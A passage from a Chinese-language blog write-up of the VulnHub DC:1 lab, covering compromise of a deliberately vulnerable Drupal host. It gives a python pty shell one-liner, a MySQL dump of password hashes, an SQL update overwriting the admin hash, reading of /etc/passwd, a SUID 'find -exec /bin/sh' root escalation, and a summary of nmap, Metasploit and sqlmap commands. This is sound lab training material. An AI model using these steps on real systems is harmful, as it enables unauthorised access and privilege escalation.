<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren&#x27;t the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$databases</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>当前 msf 提供的 shell 并不支持交互操作，可以使用 python 获取可交互式 shell。</p>
<p><strong>获取可交互式 shell</strong>：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&quot;</code></p>
<p>然后登录数据库看看。</p>
<p><code>mysql -udbuser -pR0ck3t</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/3b7268fc7f7b4326b56d1ca34b5292d4.png" alt="在这里插入图片描述"></p>
<p>之后就是一通信息搜集。</p>
<p>在 drupaldb.users 表中可以发现以下信息。可惜密码是加了密的。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">select * from users;                                                                                                          </span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+  </span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |  </span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+  </span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |  </span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |  </span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></div></figure>

<p>不过 <font style="background:#70AD47">&#x2F;var&#x2F;www&#x2F;scripts&#x2F;</font> 目录下可以获取密码加密脚本 <font style="background:#70AD47">password-hash.sh</font>，也就是说可以通过该脚本加密用户密码，然后将一个用户手动添加到数据库中。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Drupal hash script - to generate a hash from a plaintext password</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Check for your PHP interpreter - on Windows you&#x27;ll probably have to</span></span><br><span class="line"><span class="comment"> * replace line 1 with</span></span><br><span class="line"><span class="comment"> *   #!c:/program files/php/php.exe</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> password1 [password2 [password3 ...]]</span></span><br><span class="line"><span class="comment"> *  Plain-text passwords in quotes (or with spaces backslash escaped).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&quot;5.2.0&quot;</span>, <span class="string">&quot;&lt;&quot;</span>)) &#123;</span><br><span class="line">  <span class="variable">$version</span>  = PHP_VERSION;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ERROR: This script requires at least PHP version 5.2.0. You invoked it with</span></span><br><span class="line"><span class="string">       PHP version <span class="subst">&#123;$version&#125;</span>.</span></span><br><span class="line"><span class="string">\n</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$script</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">array_shift</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;--help&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Generate Drupal password hashes from the shell.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:        <span class="subst">&#123;$script&#125;</span> [OPTIONS] &quot;&lt;plan-text password&gt;&quot;</span></span><br><span class="line"><span class="string">Example:      <span class="subst">&#123;$script&#125;</span> &quot;mynewpassword&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">All arguments are long options.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --help      Print this page.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --root &lt;path&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              Set the working directory for the script to the specified path.</span></span><br><span class="line"><span class="string">              To execute this script this has to be the root directory of your</span></span><br><span class="line"><span class="string">              Drupal installation, e.g. /home/www/foo/drupal (assuming Drupal</span></span><br><span class="line"><span class="string">              running on Unix). Use surrounding quotation marks on Windows.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &quot;&lt;password1&gt;&quot; [&quot;&lt;password2&gt;&quot; [&quot;&lt;password3&gt;&quot; ...]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              One or more plan-text passwords enclosed by double quotes. The</span></span><br><span class="line"><span class="string">              output hash may be manually entered into the &#123;users&#125;.pass field to</span></span><br><span class="line"><span class="string">              change a password via SQL to a known value.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To run this script without the --root argument invoke it from the root directory</span></span><br><span class="line"><span class="string">of your Drupal installation as</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  ./scripts/<span class="subst">&#123;$script&#125;</span></span></span><br><span class="line"><span class="string">\n</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$passwords</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse invocation arguments.</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$param</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (<span class="variable">$param</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;--root&#x27;</span>:</span><br><span class="line">      <span class="comment">// Change the working directory.</span></span><br><span class="line">      <span class="variable">$path</span> = <span class="title function_ invoke__">array_shift</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="variable">$path</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">// Add a password to the list to be processed.</span></span><br><span class="line">      <span class="variable">$passwords</span>[] = <span class="variable">$param</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DRUPAL_ROOT&#x27;</span>, <span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> DRUPAL_ROOT . <span class="string">&#x27;/includes/password.inc&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> DRUPAL_ROOT . <span class="string">&#x27;/includes/bootstrap.inc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$passwords</span> <span class="keyword">as</span> <span class="variable">$password</span>) &#123;</span><br><span class="line">  <span class="keyword">print</span>(<span class="string">&quot;\npassword: <span class="subst">$password</span> \t\thash: &quot;</span>. <span class="title function_ invoke__">user_hash_password</span>(<span class="variable">$password</span>) .<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<blockquote>
<p>也可以不用这么麻烦，在 msf exploitdb 中有一个针对 Drupal 7 版本的攻击脚本，可以增加一个 admin 权限的用户账号。具体参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45864963/article/details/126696563" >https://blog.csdn.net/weixin_45864963&#x2F;article&#x2F;details&#x2F;126696563</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p>这里先放一放，继续搜集一下信息。在 <font style="background:#70AD47">&#x2F;etc&#x2F;passwd</font> 文件中可以发现一个 flag4 用户。</p>
<p><code>cat -n /etc/passwd</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/92aa1cb858764bc295b79a5e05a87fef.png" alt="在这里插入图片描述"></p>
<p>可以直接进入其 home 目录获取 flag4。</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/7a7ebe2b14c247a2ba57dd791af03dc2.png" alt="在这里插入图片描述"></p>
<blockquote>
<p>这里也可以使用 hydra + john 破解 flag4 用户的 ssh 连接密码，从而登录到 flag4 用户的账户，直接查看 flag4。具体参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48991458/article/details/121362982" >https://blog.csdn.net/weixin_48991458&#x2F;article&#x2F;details&#x2F;121362982</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p>至此，已经拿到了 flag1、flag2、flag4。</p>
<p>现在再回头利用刚才的数据库。</p>
<p>直接利用加密脚本 <font style="background:#70AD47">&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</font> 获取密码密文。</p>
<p><code>php /var/www/scripts/password-hash.sh adminpass</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/4eb877594d2640f080a07a002b7fc027.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password: adminpass</span><br><span class="line">hash: $S$DUKfIRZztxmhlJ9B3U8br8nSw3XMp0ZCJw2j.b5AUpjbUfLvupWN</span><br></pre></td></tr></table></div></figure>

<p>登录到 mysql，直接更改 drupaldb.users 表中 admin 用户的密码：</p>
<p><code>mysql -udbuser -pR0ck3t</code></p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span>&quot;$S$DUKfIRZztxmhlJ9B3U8br8nSw3XMp0ZCJw2j.b5AUpjbUfLvupWN&quot; <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></div></figure>

<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/0d0b56652ef24f88b5604da159a216c2.png" alt="在这里插入图片描述"></p>
<p>然后回到网页登录。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: adminpass</span><br></pre></td></tr></table></div></figure>

<p>火狐浏览器不知道怎么回事登不上，换了谷歌浏览器成功登入。搞得我以为攻击失败了，排查了半天……</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/e01e758b76ad472ba5ed2b4c1adad3c4.png" alt="在这里插入图片描述"></p>
<p>找到 flag3。</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/133e04cc2a564235a4fef12bc5a1181f.png" alt="在这里插入图片描述"></p>
<p>得到提示。</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/3fa6af10ebcd4a44b9ce0fad505f34e9.png" alt="在这里插入图片描述"></p>
<p>最后一个 flag 是在 <font style="background:#70AD47">&#x2F;root&#x2F;home&#x2F;</font> 目录中。</p>

        <h2 id="2-3：后渗透"   >
          <a href="#2-3：后渗透" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3：后渗透" class="headerlink" title="2.3：后渗透"></a>2.3：后渗透</h2>
      <p>尝试提权。</p>
<p>可以使用 <code>sudo -l</code> 查看用户可在系统上具有的 sudo 权限，以及可以运行的特权命令与文件。不过当前用户无法使用 <code>sudo</code> 命令。</p>
<p>使用 <code>find</code> 命令查找有 suid 属性权限的文件。</p>
<p><strong>查找 suid 属性权限文件</strong>：<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/1917d98c65f74a7dbd0821d0de5d3392.png" alt="在这里插入图片描述"></p>
<p><strong>提权</strong>：<br><code>find /usr/bin/passwd -exec &#39;/bin/sh&#39; \;</code></p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/8d7770e77fab4c248fd4307979592fb3.png" alt="在这里插入图片描述"></p>
<p>可以看到提权成功。</p>
<p>这里不考虑痕迹隐藏，拿到 root 权限就已经结束咯。</p>
<p><img src="/./assets/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/4c90e35fb14e48c2a03d05ce1253bebc.png" alt="在这里插入图片描述"></p>

        <h1 id="3：总结"   >
          <a href="#3：总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#3：总结" class="headerlink" title="3：总结"></a>3：总结</h1>
      
        <h2 id="3-1：命令-工具"   >
          <a href="#3-1：命令-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1：命令-工具" class="headerlink" title="3.1：命令 &amp; 工具"></a>3.1：命令 &amp; 工具</h2>
      <ul>
<li>nmap</li>
<li>whatweb</li>
<li>dirsearch</li>
<li>BurpSuite</li>
<li>metasploit</li>
<li>python</li>
<li>mysql</li>
<li>find</li>
</ul>

        <h3 id="3-1-1：Nmap"   >
          <a href="#3-1-1：Nmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-1：Nmap" class="headerlink" title="3.1.1：Nmap"></a>3.1.1：Nmap</h3>
      <p><strong>部分选项</strong>：</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">介绍</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-sn</code></td>
<td align="left"><code>Ping Scan - disable port scan</code></td>
</tr>
<tr>
<td align="left"><code>-sV</code></td>
<td align="left"><code>Probe open ports to determine service/version info</code></td>
</tr>
<tr>
<td align="left"><code>-sC</code></td>
<td align="left"><code>equivalent to --script=default</code></td>
</tr>
<tr>
<td align="left"><code>-O</code></td>
<td align="left"><code>Enable OS detection</code></td>
</tr>
<tr>
<td align="left"><code>--script=&lt;Lua scripts&gt;</code></td>
<td align="left"><code>&lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories</code></td>
</tr>
</tbody></table></div>
<p><strong>nmap 脚本</strong>：</p>
<ul>
<li><code>--script=default</code>：默认的脚本，提供一些基本的漏洞探测和信息收集。</li>
<li><code>--script=vuln</code>：用于检测目标系统上的漏洞。</li>
</ul>

        <h3 id="3-1-2：Metasploit"   >
          <a href="#3-1-2：Metasploit" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-2：Metasploit" class="headerlink" title="3.1.2：Metasploit"></a>3.1.2：Metasploit</h3>
      <p><strong>基本使用</strong>：</p>
<ul>
<li>启动 Metasploit：<code>msfdb init &amp;&amp; msfconsole</code></li>
<li>查找相关利用模块：<code>search &lt;key&gt;</code></li>
<li>使用模块：<code>use &lt;module&gt;</code><ul>
<li>查看该模块参数：<code>show options</code></li>
<li>设置参数：<code>set &lt;name&gt; &lt;value&gt;</code></li>
<li>执行：<code>run</code></li>
</ul>
</li>
<li>攻击成功后将显示 meterpreter 提示符。</li>
</ul>
<p><strong>后渗透模块 meterpreter 使用</strong>：</p>
<ul>
<li>打印当前工作目录：<code>pwd</code></li>
<li>获取目标主机 shell：<code>shell</code></li>
</ul>

        <h3 id="3-1-3：python"   >
          <a href="#3-1-3：python" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-3：python" class="headerlink" title="3.1.3：python"></a>3.1.3：python</h3>
      <p><strong>获取可交互式 shell</strong>：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&quot;</code></p>
<ul>
<li><code>python</code>：启动 Python 解释器。</li>
<li><code>-c</code>：表示提供 Python 代码，而不是执行从文件加载的脚本。</li>
<li><code>import pty</code>：导入 <code>pty</code> 模块，该模块提供伪终端（pseudo-terminal）支持。</li>
<li><code>pty.spawn(&#39;/bin/sh&#39;)</code>：使用 <code>pty.spawn</code> 函数，执行 <code>/bin/sh</code>，生成一个交互式 Shell。</li>
</ul>
<blockquote>
<p>通常用于绕过受限制的 Shell 环境，获取更高级别的 Shell 访问权限。</p>
</blockquote>
<p><strong>补充</strong>：</p>
<p><strong>Windows 下获取可交互式 shell</strong>：<br><code>python -c &quot;import os;os.system(&#39;cmd.exe&#39;)&quot;</code></p>

        <h3 id="3-1-4：find"   >
          <a href="#3-1-4：find" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-1-4：find" class="headerlink" title="3.1.4：find"></a>3.1.4：find</h3>
      <p><strong>查找具有 Setuid 权限位的可执行文件</strong>：<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<ul>
<li><code>find</code>：查找。</li>
<li><code>/</code>：指定查找的起始目录为根目录。</li>
<li><code>-perm -u=s</code>：用于匹配具有 Setuid 权限位的文件。</li>
<li><code>-type f</code>：限制查找结果只包括普通文件，而不包括目录或其他类型的文件。</li>
<li><code>2&gt;/dev/null</code>：将错误输出重定向到 <code>/dev/null</code>。可以使输出更加清晰。</li>
</ul>
<blockquote>
<p>Setuid 权限位允许一个程序在执行时暂时具有文件所有者的权限。</p>
</blockquote>
<p><strong>提权</strong>：<br><code>find /usr/bin/passwd -exec &#39;/bin/sh&#39; \;</code></p>
<blockquote>
<p>《find 命令提权》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/aaak/p/15718561.html" >https://www.cnblogs.com/aaak/p/15718561.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>

        <h2 id="3-2：关键技术"   >
          <a href="#3-2：关键技术" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-2：关键技术" class="headerlink" title="3.2：关键技术"></a>3.2：关键技术</h2>
      <ul>
<li><p><strong>主机发现</strong>，ip、icmp 三层发现：<br><code>nmap -sn &lt;target&gt;</code></p>
</li>
<li><p><strong>目标信息扫描</strong>，进行端口扫描、服务探测、操作系统探测：<br><code>nmap -p- -sV -sC -O &lt;target&gt;</code></p>
</li>
<li><p><strong>漏洞扫描</strong>，用 nmap 的漏洞库对端口进行扫描：<br><code>nmap --script=vuln -p &lt;port&gt; &lt;target&gt;</code></p>
</li>
<li><p><strong>网站指纹信息识别</strong>：<br><code>whatweb &lt;url&gt;</code></p>
</li>
<li><p><strong>网站目录扫描</strong>：<br><code>dirsearch -u &lt;url&gt;</code></p>
</li>
<li><p><strong>drupal CMS 漏洞利用（CVE 2014-3704）</strong></p>
</li>
<li><p><strong>sqlmap 探测</strong>，使用指定数据包，自动默认操作：<br><code>sqlmap -r &lt;file&gt; --batch</code></p>
</li>
<li><p><strong>Metasploit 渗透</strong>，CVE 2014-3704 漏洞相关模块使用</p>
</li>
<li><p><strong>获取可交互式 shell</strong>，使用 python 获取可交互式 shell：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&quot;</code></p>
</li>
<li><p><strong>进一步搜集信息</strong>，利用泄露的密码加密脚本生成密文，登录 MySQL 更改网站管理员密码。</p>
</li>
<li><p><strong>查看用户 sudo 权限</strong>，以及可以运行的特权命令与文件：<br><code>sudo -l</code> </p>
</li>
<li><p><strong>查找具有 Setuid 权限位的可执行文件</strong>：<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
</li>
<li><p><strong>提权</strong>：<br><code>find &lt;file&gt; -exec &#39;/bin/sh&#39; \;</code></p>
</li>
</ul>
<hr>
<p><font color="#778899">
人生到处知何似，应似飞鸿踏雪泥。
</font></p>
<p align="right"><font color="#778899">
——《和子由渑池怀旧》（宋）苏轼
</font></p>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://blog.lens-shrine.top">镜坛主</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://blog.lens-shrine.top/2024/01/01/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/">https://blog.lens-shrine.top/2024/01/01/WriteUp%EF%BC%9ACyber-Range/%E3%80%8AVulnHub%E3%80%8BDC%EF%BC%9A1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/02/05/%E7%95%AA%E5%A4%96%EF%BC%9A%E5%B0%8F%C2%B7%E6%84%8F%C2%B7%E6%80%9D/%E3%80%8A%E5%AE%B6%E5%B8%B8%E8%8F%9C%E8%B0%B1%E3%80%8B%E8%92%9C%E8%8B%97%E7%82%92%E5%B9%B2%E5%B7%B4/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">《家常菜谱》蒜苗炒干巴</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/11/17/%E7%95%AA%E5%A4%96%EF%BC%9A%E5%A4%A7%C2%B7%E6%9D%82%C2%B7%E7%83%A9/%E3%80%8A%E5%A4%A7%C2%B7%E6%9D%82%C2%B7%E7%83%A9%E3%80%8B%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7/"><span class="paginator-prev__text">《大·杂·烩》特殊符号</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%EF%BC%9A%E9%9D%B6%E5%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-text">
          1：靶场信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%EF%BC%9A%E6%89%93%E9%9D%B6"><span class="toc-text">
          2：打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%EF%BC%9A%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86-%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1"><span class="toc-text">
          2.1：情报收集 &amp; 威胁建模</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="toc-text">
